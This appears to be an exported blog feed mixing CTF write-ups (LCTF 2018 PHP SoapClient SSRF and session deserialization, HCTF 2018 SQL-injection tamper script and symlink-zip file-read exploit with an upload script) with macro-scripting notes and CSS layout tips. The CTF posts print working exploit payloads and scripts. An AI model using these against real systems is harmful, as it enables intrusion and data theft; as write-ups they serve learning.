    <content type="text"><![CDATA[继续填坑.. 一： soap ssrf soap服务是什么？简单而言即一种通信方式 特征在phpinfo中可以看到 利用条件有可控的点去反序列化调用soapclient类进行SSRF 那么为什么要选择使用soapclient这个类呢？ 如果开启了soap服务，soapclient类就是php的内置类 从php文档中可以看到，其第一个参数为$Url，这就为之后的ssrf作为铺垫 其次当数据被反序列化后，其对象还要调用一个不存在的类，以调用soapclient的__call方法 同时该类__call方法还有crlf注入漏洞，具体分析见：https://xz.aliyun.com/t/2148 如何触发ssrf呢？参考： https://xz.aliyun.com/t/2148#toc-0 https://php.net/manual/zh/soapclient.soapclient.php 该类实例化的时候有两个参数：第一个参数控制是否为WSDL模式。如果为NULL，就是non-WSDL模式。如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求。如果是wsdl模式，在序列化之前就会对$url参数进行请求，从而无法可控序列化数据。 本地复现：代码：123456&lt;?php$location = &apos;https://155.94.177.154:6666/&apos;;$a = new SoapClient(null, array(&apos;location&apos; =&gt; $location ,&apos;uri&apos; =&gt; &apos;123&apos;));$auth= unserialize(serial1ize($a));$auth-&gt;aa();echo &quot;1&quot;; 另一台vps上开启监听： 执行： vps监听到： 可以看到在soap库发送的xml数据在数据包的post处，所以这个的局限在于一般只能打get形的ssrf。 后来在l3m0n师傅的博客上看到可以发post请求的思路：https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html 二：php session反序列化其核心原理在于php在存储序列化$_SESSION数据引擎和反序列化该数据的引擎不一样导致。 利用条件： 在同一网站能同时出现两种不同的session配置方式： 1session.serialize_handler=php_serialize|php $_SESSION值可控 满足以上几点即等价于我们对unserialize()的参数可控。 php.ini中的配置：1234session.save_path=&quot;D:\xampp\tmp&quot; 表明所有的session文件都是存储在xampp/tmp下session.save_handler=files 表明session是以文件的方式来进行存储的session.auto_start=0 表明默认不启动sessionsession.serialize_handler=php --定义用来序列化/反序列化的处理器名字。默认使用php session.serialize_handler的其他几种配置项：123php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值php:存储方式是，键名+竖线+经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 使用session.serialize_handler=php_serialize：1234&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&quot;name&quot;] = &quot;PASSER6Y&quot;; 该方式在序列化数据前加了a:1: 而使用默认配置时(session.serialize_handler=php)：1234&lt;?php//ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&quot;name&quot;] = &quot;PASSER6Y&quot;; php引擎将竖线(|)将其分割成两部分，前面为键名，后面为序列化数据 两者的差异在于用php方式时以|分割，如果我们在php_serialize存入的数据带有|，而取出数据时使用php引擎，则会导致序列化数据在经过php引擎时被反序列化引发安全问题。 漏洞复现demo：1.php1234&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&quot;passer6y&quot;]=$_GET[&quot;a&quot;]; 2.php12345678910111213&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class aa &#123; var $hi; function __construct()&#123; $this-&gt;hi = &apos;phpinfo();&apos;; &#125; function __destruct() &#123; eval($this-&gt;hi); &#125;&#125; 构造payload：123456789101112131415161718&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class aa &#123; var $hi; function __construct()&#123; $this-&gt;hi = &apos;phpinfo();&apos;; &#125; function __destruct() &#123; eval($this-&gt;hi); &#125;&#125;$a = new aa();echo serialize($a); //O:2:&quot;aa&quot;:1:&#123;s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;&#125;echo &quot;\n\n&quot;;echo urlencode(serialize($a)); payload: https://ip/?a=|O:2:%22aa%22:1:{s:2:%22hi%22;s:10:%22phpinfo();%22;} 然后访问：2.php 最后回到题目来看，分析一下题目逻辑；index.php1234567891011&lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[&apos;f&apos;],$_POST);session_start();if(isset($_GET[&apos;name&apos;]))&#123; $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);call_user_func($b,$a); flag.php1234567&lt;?phpsession_start();echo &apos;only localhost can get flag!&apos;;$flag = &apos;LCTF&#123;******************&#125;&apos;;if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;$_SESSION[&apos;flag&apos;] = $flag;&#125; 第一个call_user_func()函数可以帮助我们将php的session处理方式设置为php_serialize，这里可以使用session_start()来开启，他支持一个数组参数： 所以这一步我们将$_GET[&#39;f&#39;]=session_start,然后post数据：serialize_handler=php_serialize 再往下$_GET[&#39;name&#39;]，这使得我们可以控制session，所以这一步传入我们的soup的ssrf反序列化数据。 从flag.php中可知，flag是存储在我们的session中的(成功触发后，var_dump($_SESSION);会显示出我们的flag)，所以我们ssrf的时候要带上session，这里会用到soup ssrf的crlf漏洞。 当然在这里，soup ssrf 还需要一步，就是调用其类中的__call方法，这里参考文档： 所以我们将精心构造的session数据存入后，第二次访问，利用变量覆盖将$b变成call_user_func，然后就能调用一个不存在的方法(welcome_to_the_lctf2018),从而触发__call方法，形成ssrf。 不知道环境问题还是啥调了很久，在第一步修改session_handle的类型时修改失败了，导致后面无法触发ssrf。复现的时候没有官方docker，调了很久还是不是很明白… 嫖的exp：12345678$target=&apos;https://127.0.0.1/flag.php&apos;;$b = new SoapClient(null,array(&apos;location&apos; =&gt; $target, &apos;user_agent&apos; =&gt; &quot;AAA:BBB\r\n&quot; . &quot;Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912&quot;, &apos;uri&apos; =&gt; &quot;https://127.0.0.1/&quot;));$se = serialize($b); echo urlencode($se); 第二步：]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[按键精灵学习记录]]></title>
    <url>%2F2019%2F02%2F09%2F%E6%8C%89%E9%94%AE%E7%B2%BE%E7%81%B5%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[代码：https://github.com/Passer6y/quickMacro 基础 声明变量:Dim12Dim screenXscreenX = GetScreenX（） 2.延时:Delay1Delay 1000 //延时1000毫秒，也就是1秒再往下执行 点击触摸屏幕中的一个位置-&gt;经过一小段时间延时-&gt;放手123TouchDown x,y,1 //x,y为坐标，也就是点击屏幕的位置Delay 50TouchUp 1 tap封装了以上的几个操作步骤：Tap x,y 安卓三键：主菜单、主页、返回 123KeyPress &quot;Menu&quot;KeyPress &quot;Home&quot;KeyPress &quot;Back&quot; 调试：ShowMessage和TracePrintShowMessage:显示提示，两条消息之间建议1秒以上间隔。TracePrint：在调试页显示信息 1234567Dim 循环次数 = 0Do Delay 1000 循环次数 = 循环次数+1 TracePrint “循环次数：”&amp;循环次数&amp;“次” ShowMessage “循环次数：”&amp;循环次数&amp;“次”Loop 滑屏幕：swipe 1Swipe 10,10,100,100,300 //从坐标10,10划动到坐标100,100，历时300毫秒 滑动 停顿 再松12345TouchDown 10, 10, 1Delay 1000TouchMove 100, 100, 1, 300Delay 1000TouchUp 1 循环demo1:循环点击 (10,10) 一千次1234For 1000 Tap 10,10 // 退出 Exit ForNext demo2: 一直点击1234DoTap 10,10//退出 Exit DoLoop 图色操作 获取屏幕上某点颜色：GetPixelColor() 1234567Dim rColorrColor = GetPixelColor(300, 300)If rColor = &quot;FFFFFF&quot; Then TracePrint &quot;坐标（300,300）的像素点颜色是FFFFFF，说明当前处于XX界面下&quot;Else TracePrint &quot;坐标（300,300）的像素点颜色不是FFFFFF，说明还没到XX界面&quot;End If 多点比色:CmpColorEx(mul_color,sim)即判断当前场景取点(2,2)和点(4,3)以000000-202020的偏色范围(前后各10),相似度0.9的容错判断是否为同一个图，可以用抓抓快捷生成参数。 12345If CmpColorEx(&quot;2|2|000000-202020,4|3|000000-202020&quot;, 0.9) = 1 Then TracePrint &quot;这是第二个图&quot;Else TracePrint &quot;这不是第二个图&quot;End If 抓抓快捷生成参数： 取两点-&gt;点开’颜色’-&gt;在’颜色记录汇总’选中我们采的两点-&gt;进入‘多点比色’模式-&gt;复制’颜色描述’即可 多点找色：FindMultiColor即找到唯一的图标的作用0,0,0,0表示全屏查找，10,20,30,40表示从坐标(10,20)和(30,40)组成的矩形范围。000000初始点的颜色值?，000000-202020(202020依旧是偏色)0|1是相对坐标(往右0，往下1)1234567Dim IntX,IntYFindMultiColor 0,0,0,0,&quot;000000&quot;,&quot;0|1|000000-202020&quot;,0,0.9,intX,intYIf intX &gt; -1 Then TracePrint &quot;找到啦，坐标在&quot;&amp;intX&amp;&quot;,&quot;&amp;intYElse TracePrint &quot;没找到&quot;End If 抓抓多点找色：和上面一样的方法 函数 定义/调用函数123Function 自定义函数() TracePrint “我是自定义函数，被你调用了”End Function 调用函数：123自定义函数自定义函数() // 推荐Call 自定义函数() demo:比大小12345678910111213141516Function 比大小(参数1, 参数2) If 参数1 &gt; 参数2 Then 比大小 = 参数1 // 函数返回值 ElseIf 参数1 &lt; 参数2 Then 比大小 = 参数2 Else TracePrint &quot;两个数一样大&quot; End IfEnd FunctionDim numA,numBnumA = 3numB = 3If 比大小(numA, numB) &lt;&gt; null Then TracePrint &quot;较大的值是：&quot;&amp;比大小(numA,numB)End If 数据类型转换我们从用户输入中读取的数据往往需要做类型转换。demo: 将输入框的数据从字符串型变成整型1234Dim 用户输入 = ReadUIConfig(&quot;输入框1&quot;)If CInt(用户输入) = 1 Then TracePrint 用户输入End If 日志开启log记录后，会将所有的tranceprint都输出到log文件123456Log.Open **************TracePrint &quot;test&quot;TracePrint GetTempDir()**************Log.Close 分辨率使用的720x1280的设备开发的程序则注明如下代码，以便程序自适应其他设备(多点比色，找色这些功能才有用)1SetScreenScale 720,1280 多线程一般用于一个线程运行脚本，另一个线程干其他的(检测是否卡主等等)]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HCTF 2018 Web Writeup]]></title>
    <url>%2F2019%2F02%2F05%2FHCTF%202018%20Web%20WriteUp%2F</url>
    <content type="text"><![CDATA[近来有时间补了一下之前比赛遗留下来的wp Kzone仿的一个qq空间的钓鱼站，www.zip下载源码后，尝试各个功能点审计，动态调试后，发现正常登录的功能点不会设置一个名为`login_data`参数的cookie，而这个点可以用来登录， 也算是出题人后来加上的功能点，然后将其当成考点？ 登录的时候是不会自动带上这个参数的：我们手动设置后，然后将其导入到浏览器cookie中，可以用这个cookie登录。 其过程为：在后台登录前，会包含一个共有的文件： 这里重点关注member.php： 使用cookie登录的数据会进行一次json_decode解码： 这里学习了有的师傅使用了json_decode()会unicode自动解码的特性绕过。 嫖了一个tamper脚本1234567891011121314151617181920212223242526#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): data = &apos;&apos;&apos;&#123;&quot;admin_user&quot;:&quot;%s&quot;&#125;;&apos;&apos;&apos; payload = payload.lower() payload = payload.replace(&apos;u&apos;, &apos;\u0075&apos;) payload = payload.replace(&apos;o&apos;, &apos;\u006f&apos;) payload = payload.replace(&apos;i&apos;, &apos;\u0069&apos;) payload = payload.replace(&apos;\&apos;&apos;, &apos;\u0027&apos;) payload = payload.replace(&apos;\&quot;&apos;, &apos;\u0022&apos;) payload = payload.replace(&apos; &apos;, &apos;\u0020&apos;) payload = payload.replace(&apos;s&apos;, &apos;\u0073&apos;) payload = payload.replace(&apos;#&apos;, &apos;\u0023&apos;) payload = payload.replace(&apos;&gt;&apos;, &apos;\u003e&apos;) payload = payload.replace(&apos;&lt;&apos;, &apos;\u003c&apos;) payload = payload.replace(&apos;-&apos;, &apos;\u002d&apos;) payload = payload.replace(&apos;=&apos;, &apos;\u003d&apos;) payload = payload.replace(&apos;f1a9&apos;, &apos;F1a9&apos;) payload = payload.replace(&apos;f1&apos;, &apos;F1&apos;) return data % payload python sqlmap.py -r jsondecode --tamper &quot;jsondecodeBypassTamper.py&quot; -v 3 --dbs --dbms=mysql --level 2 然鹅预期解是读install.sql，会发现数据表引擎使用的是innodb。MySQL 5.7 之后的版本，在其自带的 mysql 库中，新增了 innodb_table_stats 和 innodb_index_stats 这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息。 因为过滤了or，所以布尔盲注的时候利用setcookie次数造成的差异进行注入。 造成布尔盲注的流程：如果查询用户名不为空，且密码和数据库中哈希进行弱类型比较绕过成功，则登录成功。如果查询用户名为空，当然此时密码肯定也不会和空相等，所以会有四次set-cookie 当然也可以在密码一直比较错误的情形下利用：用户名字段查询不到东西(为空)：set-cookie四次用户名字段查询到东西：set-cookoe两次 HideAndSeek注册后题目是一个上传zip文件的地方，会自动解压并渲染出文件内容。奇怪的是提交完之后直接就在这样一个https://206.189.144.143:20000/upload路径下渲染了，也没有具体的文件名等信息。 如果再去访问upload会进行跳转，所以猜测是渲染一次之后就删了。尝试构造文件名../../../../../../etc/passwd的压缩文件(瞎试的)，返回一片空白..其次压缩文件里有目录结构，也会返回空白。 网上找到一篇文件上传软连接的文章：https://xz.aliyun.com/t/2589 构造软连接压缩文件 zip -y 表示存储链接文件，不会替代源文件 上传压缩文件后得到： 现在有了一个任意文件读取，接下来得猜测目录,尝试读取proc伪文件`/proc/self/cwd 读不到东西，猜想原因如下： 再试试读环境变量：/proc/self/environ,这里读到了很多相关文件信息 再读一下：/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini 知识面太窄了，没接触过flask，后来才知道这是源码路径：/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 反正源码就大概在/app目录下，之后就是脑洞和经验了.. wp说由cookie可以猜到是flask，然后提示用的docker，默认在/app/main.py，所以去读/app/main.py12345678910111213141516171819import sysfrom flask import Flaskapp = Flask(__name__)@app.route(&quot;/&quot;)def hello(): version = &quot;&#123;&#125;.&#123;&#125;&quot;.format(sys.version_info.major, sys.version_info.minor) message = &quot;Hello World from Flask in a uWSGI Nginx Docker container with Python &#123;&#125; (default)&quot;.format( version ) return messageif __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, debug=True, port=80) 读出源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)app.config[&apos;UPLOAD_FOLDER&apos;] = &apos;./uploads&apos;app.config[&apos;MAX_CONTENT_LENGTH&apos;] = 100 * 1024ALLOWED_EXTENSIONS = set([&apos;zip&apos;])def allowed_file(filename): return &apos;.&apos; in filename and \ filename.rsplit(&apos;.&apos;, 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])def index(): error = request.args.get(&apos;error&apos;, &apos;&apos;) if(error == &apos;1&apos;): session.pop(&apos;username&apos;, None) return render_template(&apos;index.html&apos;, forbidden=1) if &apos;username&apos; in session: return render_template(&apos;index.html&apos;, user=session[&apos;username&apos;], flag=flag.flag) else: return render_template(&apos;index.html&apos;)@app.route(&apos;/login&apos;, methods=[&apos;POST&apos;])def login(): username=request.form[&apos;username&apos;] password=request.form[&apos;password&apos;] if request.method == &apos;POST&apos; and username != &apos;&apos; and password != &apos;&apos;: if(username == &apos;admin&apos;): return redirect(url_for(&apos;index&apos;,error=1)) session[&apos;username&apos;] = username return redirect(url_for(&apos;index&apos;))@app.route(&apos;/logout&apos;, methods=[&apos;GET&apos;])def logout(): session.pop(&apos;username&apos;, None) return redirect(url_for(&apos;index&apos;))@app.route(&apos;/upload&apos;, methods=[&apos;POST&apos;])def upload_file(): if &apos;the_file&apos; not in request.files: return redirect(url_for(&apos;index&apos;)) file = request.files[&apos;the_file&apos;] if file.filename == &apos;&apos;: return redirect(url_for(&apos;index&apos;)) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file_save_path = os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename) if(os.path.exists(file_save_path)): return &apos;This file already exists&apos; file.save(file_save_path) else: return &apos;This file is not a zipfile&apos; try: extract_path = file_save_path + &apos;_&apos; os.system(&apos;unzip -n &apos; + file_save_path + &apos; -d &apos;+ extract_path) read_obj = os.popen(&apos;cat &apos; + extract_path + &apos;/*&apos;) file = read_obj.read() read_obj.close() os.system(&apos;rm -rf &apos; + extract_path) except Exception as e: file = None os.remove(file_save_path) if(file != None): if(file.find(base64.b64decode(&apos;aGN0Zg==&apos;).decode(&apos;utf-8&apos;)) != -1): return redirect(url_for(&apos;index&apos;, error=1)) return Response(file)if __name__ == &apos;__main__&apos;: #app.run(debug=True) app.run(host=&apos;127.0.0.1&apos;, debug=True, port=10008) 看到他import了flag，直接去读flag，然鹅..直接被拦了 所以现在思路就是越权成为admin，这里使用的一个固定的随机数种子，uuid.getnode()获得10进制mac地址，可以在/sys/class/net/eth0/address读到mac地址，所以可以伪造session越权称为admin， 读到mac地址：02:42:ac:11:00:02，在线转成10进制：https://www.vultr.com/tools/mac-converter/?mac_address=02%3A42%3Aac%3A11%3A00%3A02得到种子：2485377892354 然后本地搭一下flask环境拿到session即可得到flag。 最后看了其他师傅们的wp，还可以读.bash_history等等，这里嫖了一个exp(我全程手动操作的..)1234567891011121314151617181920212223242526272829303132333435363738394041import requestsimport random import osimport stringimport timeimport zipfileimport sysdef generate_zip(path,i): zip_name = &apos;moxiaoxi&apos;+str(i)+&apos;.zip&apos; link_namme = &apos;moxiaoxi&apos;+str(i) os.system(&quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme)) print &quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme) os.system(&quot;zip -y &#123;&#125; &#123;&#125;&quot;.format(zip_name,link_namme)) with open(zip_name,&apos;r&apos;) as f: data = f.read() return zip_name,datadef exp(path,i): zip_name,data = generate_zip(path,i) # zip_name,data = rewrite(path,i) session = requests.Session() paramsPost = &#123;&quot;submit&quot;:&quot;Submit&quot;&#125; paramsMultipart = [(&apos;the_file&apos;, (zip_name, data, &apos;application/zip&apos;))] headers = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Linux; Android 9.0; SAMSUNG-SM-T377A Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36&quot;,&quot;Referer&quot;:&quot;https://hideandseek.2018.hctf.io/&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;DNT&quot;:&quot;1&quot;&#125; cookies = &#123;&quot;session&quot;:&quot;eyJ1c2VybmFtZSI6Im1veGlhb3hpIn0.Dsf5zA.yM84QphtcfEoykAu2lwjxp7_QvI&quot;&#125; response = session.post(&quot;https://hideandseek.2018.hctf.io/upload&quot;, data=paramsPost, files=paramsMultipart, headers=headers, cookies=cookies) print(&quot;Status code: %i&quot; % response.status_code) print(&quot;Response body: %s&quot; % response.content) if len(response.content)&gt;5: # print(&quot;Response body: %s&quot; % response.content) with open(&apos;out.txt&apos;,&apos;a+&apos;) as f: f.write(&apos;\n\n&#123;&#125;\n\n&#123;&#125;&apos;.format(path,response.content)) if __name__==&apos;__main__&apos;: name = &apos;test&apos;+&apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 4)) exp(sys.argv[1],name)]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS Tricks]]></title>
    <url>%2F2019%2F01%2F29%2FCSS%20Tricks%2F</url>
    <content type="text"><![CDATA[接上一篇文章，学习css中踩的坑，一些小的知识点汇总，wiki的前端设计也总算是可以告一段落了，效果图： 水平/垂直居中总结：行内元素: 用text-align:center居中，用line-height垂直居中； 块状元素: 用margin: 0 auto水平居中，垂直居中用：display:table-cell; vertical-align:middle。如果已设块状元素高度，可以将margin-top和margin-bottom设为：(父元素高度-子元素高度)/2； 水平垂直同时居中还有一种办法，将父元素position设为relative，该元素设为absolute，然后margin:auto即可。 other:实际开发中遇到的一个问题，使用了绝对定位交叉轴位置(设置了top),如果此时想实现在水平自动定位的话，得给他加一个子标签，然后用margin: 0 auto,父标签记得设置宽度width: 100% 还有一种办法即,子盒子设百分比宽高，边距用相对的position调整123456789101112.feature-3&#123; width: 100%; height: 1000px; &#125;.feature-3 .feature-box&#123; width: 72%; height: 90%; margin: 0 auto; position: relative; top: 25px;&#125; 参考： https://www.cnblogs.com/chaixiaozhi/p/8490725.html input标签透明background-color: transparent; 背景图高度自适应问题我们想让一个背景图纵向填充整个屏幕, 要先将其父元素全部使用高度100%自适应，这样子元素才会生效12345678910html,body&#123; height: 100%;&#125;.menu&#123; height: 100%; width: 100px; background: url(&apos;image/Base.png&apos;); &#125; 字体图片在列表中对不齐时 给每个图指定宽度，垂直居中即可12345678910111213img&#123; width: 18px; vertical-align:middle;//指定行内元素（inline）或表格单元格（table-cell）元素的垂直对齐方式。 margin-right: 5px;&#125;&lt;dl&gt; &lt;dt&gt;YOUR PEODUCTS &lt;img src=&quot;image/Settings.png&quot; alt=&quot;&quot;&gt;&lt;/dt&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Book of Wisdom.png&quot; alt=&quot;&quot;&gt; Book&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Video Camera.png&quot; alt=&quot;&quot;&gt; Tutorials&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Chart.png&quot; alt=&quot;&quot;&gt; Stocks&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Painting.png&quot; alt=&quot;&quot;&gt; Infographics&lt;/a&gt;&lt;/dd&gt;&lt;/dl&gt; 将非可点击的元素设置悬停由鼠标指针变成手cursor: pointer; 搜索框写法12345678910111213141516171819202122232425262728293031323334353637383940.search&#123; height: 70px; width: 100%; border-bottom: 1px solid #ccc; border-right: 1px solid #ccc; position: absolute; top:0;&#125;.search .search-box&#123; display: block; width: 340px; height: 35px; margin: 0 auto; margin-top: 17.5px; /*居中的另外一种写法，(父元素高-子元素高)/2*/ margin-bottom: 17.5px; border: 1px solid rgba(0, 0, 0, 0.1); border-radius: 8px; text-indent: 1em; &#125;.search .search-box .m-search&#123; height: 100%; width: 85%; outline: none; /*关闭聚焦时的外框*/&#125;.search .search-box img&#123; width: auto; height: auto; position: relative; top:3px; left: 2px; cursor: pointer; /*悬停变成小手*/&#125;&lt;div class=&quot;search&quot;&gt; &lt;div class=&quot;search-box&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;m-search&quot; placeholder=&quot;Search&quot;&gt; &lt;img src=&quot;image/Search icon.png&quot; alt=&quot;&quot;&gt; &lt;/div&gt;&lt;/div&gt; 给图片加悬浮阴影效果 两个图片放入同一个父盒子，将hover效果图利用定位，定位到和初始图一个位置，设好hover效果图初始为不可见，然后用:hover改变透明度。 1234567891011121314151617181920.team-name&#123; margin: 10px 10px; position: relative;&#125;.team-name .cover&#123; opacity: 0; /*将覆盖的图设为不可见*/ position: absolute; /*将覆盖图和原始图定位到同一个位置*/ top: 0; bottom: 0; left: 0; right: 0; z-index: 1;&#125;.team-name:hover .cover&#123; opacity: 0.9; &#125;&lt;div class=&quot;team-name&quot;&gt; &lt;img src=&quot;images/Userpic-1.jpg&quot; alt=&quot;&quot;&gt;&lt;!--初始图--&gt; &lt;div&gt;&lt;img class=&quot;cover&quot; src=&quot;images/active.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;!--hover后覆盖的图--&gt;&lt;/div&gt; 完整效果：悬浮阴影效果.gif 实现边线上加文字效果 1234567891011121314.line&#123; height: 1px; text-align: center; /*让span中间文字到中间*/ border: 1px solid #ccc; &#125;.line span&#123; position: relative; top: -12px; /*移动到线上*/ font-size: 14px; color: #7f8fa4; background: white; padding: 0 20px; &#125; &lt;div class=&quot;line&quot;&gt;&lt;span&gt;↑ 安全客推送 ↑&lt;/span&gt;&lt;/div&gt; 在元素盒子前加上小光点使用::before伪元素，使用负的left移到盒子前面。123456789101112.choose::before&#123; content: &quot;&quot;; position: absolute; border-radius: 100px; display: block; box-shadow: 1px 0 5px 2px #214e74; width: 2px; height: 4px; background-color: #2399f1; top: 60px; left: -29px; &#125; 左右两栏固定布局方法 使用float布局 1234567891011121314 .left-float&#123; float: left; width: 30%; height: 100px; background: rgb(17, 0, 255); &#125; .right-float&#123; float:right; width: 70%; height: 100px; background: rgb(77, 209, 77); &#125;&lt;div class=&quot;left-float&quot;&gt;left-float/div&gt;&lt;div class=&quot;right-float&quot;&gt;right-float&lt;/div&gt; 使用flex进行布局(好用！) 12345678910111213141516.flex&#123; display: flex;&#125;.left-flex&#123; flex:3; background:hotpink&#125;.right-flex&#123; flex:7; background:khaki;&#125;&lt;div class=&quot;flex&quot;&gt; &lt;div class=&quot;left-flex&quot;&gt;left-flex&lt;/div&gt; &lt;div class=&quot;right-flex&quot;&gt;right-flex&lt;/div&gt;&lt;/div&gt; 使用绝对定位布局(不推荐) 1234567891011121314151617.left-position&#123; position:absolute; top: 100px; left: 0; width: 30%; background:rgb(0, 140, 255);&#125;.right-position&#123; position:absolute; right: 0; top: 100px; width:70%; background: rgb(202, 127, 30);&#125;&lt;div class=&quot;left-position&quot;&gt;left-position&lt;/div&gt;&lt;div class=&quot;right-position&quot;&gt;right-position&lt;/div&gt; 左固定右动态的两列布局 float+BFC方法123456789101112131415.left-float&#123; float: left; width:200px; height: 500px; color: black; background: rgb(228, 139, 23);&#125;.right-float&#123; background: red; height: 500px; margin-left: 205px;&#125;&lt;div class=&quot;left-float&quot;&gt;left&lt;/div&gt;&lt;div class=&quot;right-float&quot;&gt;right&lt;/div&gt; absolute + margin-left 1234567891011121314 .left-absolute&#123; position: absolute; width: 200px; height: 500px; left:0; background: rgb(255, 187, 0); &#125; .right-absolute&#123; margin-left: 205px; height: 500px; background: red; &#125;&lt;div class=&quot;left-absolute&quot;&gt;left-absolute&lt;/div&gt;&lt;div class=&quot;right-absolute&quot;&gt;right-absolute&lt;/div&gt; flex(好用！) 12345678910111213.left-flex&#123; flex: 0 0 200px; background: red; &#125;.right-flex&#123; flex: 1 1 auto; background: green;&#125;&lt;div class=&quot;flex&quot;&gt; &lt;div class=&quot;left-flex&quot;&gt;left-flex&lt;/div&gt; &lt;div class=&quot;right-flex&quot;&gt;right-flex&lt;/div&gt;&lt;/div&gt; flex: 0 0 200px：表示值为固定200px，不和其他元素成比例关系，同时宽度不够时也不会收缩，即固定。 margin 为负值的用法 margin的参考线有两类，一类是top、left，它们以外元素作为参考线，另一类是right、bottom，它们以自身作为参考线。简单点说就是： top负值就是以包含块(Containing block) 内容区域的上边或者上方相连元素 margin 的下边为参考线; left负值就是以包含块(Containing block) 内容区域的左边或者左方相连元素 margin 的右边为参考线; right负值就是以元素本身border的右边为参考线； bottom负值就是以元素本身border的下边为参考线； 双飞翼布局即三栏布局，两边盒子固定，中间盒子自适应的布局123&lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt;&lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt;&lt;div class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt; 这样写dom，浏览器加载顺序依次为：主列、子列、附加列。但是我们要的效果是左边为子列，中间为主列，右边为附加列。 而且我们要的效果是左右两边盒子宽度固定，中间自适应(width:100%)，缩放页面时宽度不小于700px(给body加个最小宽度) 这里可以使用margin为负的布局，使得主列在中间，子列和附加列在左右。1234567891011121314151617181920212223.col-main&#123; float: left; width: 100%; background:red;&#125;.col-sub&#123; float: left; width: 190px; margin-left: -100%; background:green;&#125;.col-extra&#123; float: left; width: 190px; margin-left: -190px; background: blue;&#125;&lt;div class=&quot;demo&quot;&gt; &lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt; &lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt; &lt;div class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt;&lt;/div&gt; 初步的布局已经成形了，但是主列的文字被子列挡住了，这时候可能会想着在主列的css上加margin-left，因为我们子列的布局是靠着主列的右边线定位的，直接加的话会影响到整体布局，这里有几种实现办法： 在主列内建一个盒子，设置该盒子的margin-left/rightdemo:1234567891011121314151617181920212223242526272829303132.main&#123; float: left; width:100%; height: 600px;; background: rgb(16, 149, 202);&#125;.left&#123; float: left; margin-left: -100%; width: 200px; height: 600px; background: rgb(130, 47, 214);&#125;.right&#123; float: left; width: 200px; margin-left: -200px; height: 600px; background: rgb(255, 217, 0);&#125;.wrap&#123; margin: 0 200px;&#125;body&#123; min-width: 700px; /*设置最小宽度*/&#125;&lt;!-- 使用相对定位来解决中间盒子显示问题 --&gt;&lt;div 